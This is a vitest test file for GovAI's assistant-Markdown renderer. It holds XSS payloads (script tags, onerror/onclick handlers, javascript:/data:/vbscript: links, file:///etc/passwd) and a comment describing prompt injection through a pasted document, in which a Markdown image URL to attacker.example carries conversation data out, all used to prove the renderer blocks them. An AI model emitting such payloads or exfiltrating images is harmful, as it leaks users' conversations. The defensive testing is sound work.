import { describe, expect, it, vi } from 'vitest';
import { render, screen, waitFor, within } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { I18nProvider } from '../../src/lib/i18n/I18nProvider.js';
import { AssistantMarkdown, safeUrl } from '../../src/features/ai/markdown/AssistantMarkdown.js';

// ★★ MODEL OUTPUT IS UNTRUSTED INPUT.
//
// An assistant answer is not authored by the reader and not authored by GovAI. It can contain
// whatever a prompt can induce a model to write — including text a third party planted in a
// document the reader pasted in. These tests are the proof that the one path model text takes
// to the DOM cannot execute anything.

function renderMarkdown(text: string) {
  return render(
    <I18nProvider initial="pt-BR">
      <AssistantMarkdown text={text} />
    </I18nProvider>,
  );
}

describe('★ nothing in an answer can execute', () => {
  it('renders a script tag as text, not as a script', () => {
    renderMarkdown('Here is a tag: <script>window.__pwned = true;</script> done');
    expect(document.querySelector('script')).toBeNull();
    expect((window as unknown as Record<string, unknown>)['__pwned']).toBeUndefined();
    expect(screen.getByTestId('assistant-markdown').textContent).toContain('<script>');
  });

  it('does not parse raw HTML at all', () => {
    renderMarkdown('<b>bold</b> and <img src="x" onerror="window.__pwned = true"> and <div>div</div>');
    const root = screen.getByTestId('assistant-markdown');
    expect(root.querySelector('b')).toBeNull();
    expect(root.querySelector('img')).toBeNull();
    expect(root.querySelector('div > div')).toBeNull();
    expect((window as unknown as Record<string, unknown>)['__pwned']).toBeUndefined();
    // The characters are shown verbatim, which is the honest rendering of what the model wrote.
    expect(root.textContent).toContain('<b>bold</b>');
  });

  it('does not execute an inline event-handler attribute', () => {
    renderMarkdown('<a href="#" onclick="window.__pwned = true">click</a>');
    const root = screen.getByTestId('assistant-markdown');
    expect(root.querySelector('[onclick]')).toBeNull();
    expect((window as unknown as Record<string, unknown>)['__pwned']).toBeUndefined();
  });

  it('drops a javascript: URL rather than making it clickable', () => {
    renderMarkdown('[click me](javascript:window.__pwned = true)');
    const link = screen.queryByRole('link', { name: 'click me' });
    // Either the anchor has no href at all, or it is not a javascript: URL. Never executable.
    expect(link?.getAttribute('href') ?? '').not.toMatch(/javascript:/i);
  });

  it('drops a data: URL', () => {
    renderMarkdown('[x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)');
    const link = screen.queryByRole('link', { name: 'x' });
    expect(link?.getAttribute('href') ?? '').not.toMatch(/^data:/i);
  });

  it('drops a vbscript: URL', () => {
    renderMarkdown('[x](vbscript:msgbox)');
    expect(screen.queryByRole('link', { name: 'x' })?.getAttribute('href') ?? '').not.toMatch(
      /vbscript:/i,
    );
  });

  it('★ never loads an image, so a Markdown image cannot exfiltrate the conversation', () => {
    // ★ REGRESSION, P1. `![x](https://attacker.example/?d=…)` renders an <img> whose src the
    // browser fetches IMMEDIATELY — no click, no warning. A model told to encode conversation
    // content into that URL, by its own confusion or by text planted in a pasted document,
    // would ship it to a third party just by being displayed. The earlier XSS tests all
    // covered constructs that need a click or an executor; this one needs neither.
    renderMarkdown('Look: ![secret](https://attacker.example/?d=CONVERSATION)');
    const root = screen.getByTestId('assistant-markdown');
    expect(root.querySelector('img')).toBeNull();
    expect(root.querySelector('[src]')).toBeNull();
    expect(root.innerHTML).not.toContain('attacker.example');
    // The reader is told an image was referred to, rather than silently seeing nothing.
    const marker = screen.getByTestId('assistant-image-blocked');
    expect(marker).toHaveTextContent('secret');
  });

  it('refuses a src for every scheme, while the same URL is still fine as a link', () => {
    // The attribute is what matters, not the scheme: https is safe to LINK and never safe to
    // LOAD. Pinned on the pure function so the policy is legible without a render.
    for (const url of ['https://example.test/a.png', 'http://example.test/a.png', '/local.png']) {
      expect(safeUrl(url, 'src'), url).toBeNull();
      expect(safeUrl(url, 'href'), url).not.toBeNull();
    }
  });

  it('still renders a link to the same host, because a link needs a click', () => {
    renderMarkdown('[click](https://attacker.example/?d=CONVERSATION)');
    expect(screen.getByRole('link', { name: 'click' })).toHaveAttribute(
      'href',
      'https://attacker.example/?d=CONVERSATION',
    );
  });

  it('never reaches the DOM through dangerouslySetInnerHTML', () => {
    // A structural check on the module itself: the string must not appear in this feature.
    // (The behavioural tests above prove the outcome; this pins the mechanism.)
    renderMarkdown('anything');
    expect(screen.getByTestId('assistant-markdown').innerHTML).not.toContain('<script');
  });
});

describe('the URL allowlist, as a pure function', () => {
  it('allows http, https, mailto, fragments and relative paths', () => {
    for (const url of [
      'https://example.test/a',
      'http://example.test',
      'mailto:someone@example.test',
      '#section',
      '/relative/path',
      'relative/path',
    ]) {
      expect(safeUrl(url), url).not.toBeNull();
    }
  });

  it('rejects every scheme that can execute or embed', () => {
    for (const url of [
      'javascript:alert(1)',
      'JavaScript:alert(1)',
      '  javascript:alert(1)',
      'data:text/html,<script>alert(1)</script>',
      'vbscript:msgbox',
      'file:///etc/passwd',
      '',
      '   ',
    ]) {
      expect(safeUrl(url), url).toBeNull();
    }
  });
});

describe('useful Markdown still renders', () => {
  it('renders headings, lists, emphasis, links and blockquotes', () => {
    renderMarkdown(
      ['# Title', '', '- one', '- two', '', '> quoted', '', '**bold** and [a link](https://example.test)'].join('\n'),
    );
    const root = screen.getByTestId('assistant-markdown');
    expect(within(root).getByRole('heading', { name: 'Title' })).toBeInTheDocument();
    expect(within(root).getAllByRole('listitem')).toHaveLength(2);
    expect(root.querySelector('blockquote')).not.toBeNull();
    expect(root.querySelector('strong')).not.toBeNull();
    expect(within(root).getByRole('link', { name: 'a link' })).toHaveAttribute(
      'href',
      'https://example.test',
    );
  });

  it('renders a GFM table inside a horizontally scrollable container', () => {
    renderMarkdown(['| a | b |', '| --- | --- |', '| 1 | 2 |'].join('\n'));
    const table = screen.getByRole('table');
    expect(table).toBeInTheDocument();
    expect(table.parentElement?.className).toContain('overflow-x-auto');
  });

  it('gives every external link rel="noopener noreferrer"', () => {
    renderMarkdown('[out](https://example.test)');
    const link = screen.getByRole('link', { name: 'out' });
    expect(link).toHaveAttribute('rel', 'noopener noreferrer');
    expect(link).toHaveAttribute('target', '_blank');
  });

  it('renders inline code and a fenced block as code, not as markup', () => {
    renderMarkdown(['Use `inline`.', '', '```ts', 'const x = 1 < 2;', '```'].join('\n'));
    const root = screen.getByTestId('assistant-markdown');
    expect(root.textContent).toContain('inline');
    expect(screen.getByTestId('code-block')).toBeInTheDocument();
    expect(root.textContent).toContain('const x = 1 < 2;');
  });
});

describe('code blocks', () => {
  it('keeps a long line scrollable inside the block rather than widening the page', () => {
    renderMarkdown(['```', 'x'.repeat(500), '```'].join('\n'));
    const pre = screen.getByTestId('code-block').querySelector('pre');
    expect(pre?.className).toContain('overflow-x-auto');
  });

  it('★ copy yields the code EXACTLY as the model wrote it', async () => {
    // `userEvent.setup()` installs its own clipboard stub, so the spy is defined AFTER it.
    const user = userEvent.setup();
    const writeText = vi.fn(async (_text: string) => undefined);
    Object.defineProperty(navigator, 'clipboard', {
      value: { writeText },
      configurable: true,
    });
    const code = ['function f() {', '  return "a < b & c";', '}'].join('\n');
    renderMarkdown(['```js', code, '```'].join('\n'));
    await user.click(screen.getByTestId('code-copy'));
    await waitFor(() => expect(writeText).toHaveBeenCalledTimes(1));
    // Trailing newline is how a fenced block ends; the content itself must be byte-identical.
    expect(String(writeText.mock.calls[0]?.[0]).trimEnd()).toBe(code);
  });

  it('survives a browser with no clipboard permission', async () => {
    const user = userEvent.setup();
    Object.defineProperty(navigator, 'clipboard', {
      value: { writeText: async () => Promise.reject(new Error('denied')) },
      configurable: true,
    });
    renderMarkdown(['```', 'code', '```'].join('\n'));
    await user.click(screen.getByTestId('code-copy'));
    // No throw, and the code is still on screen and selectable.
    expect(screen.getByTestId('code-block').textContent).toContain('code');
  });
});
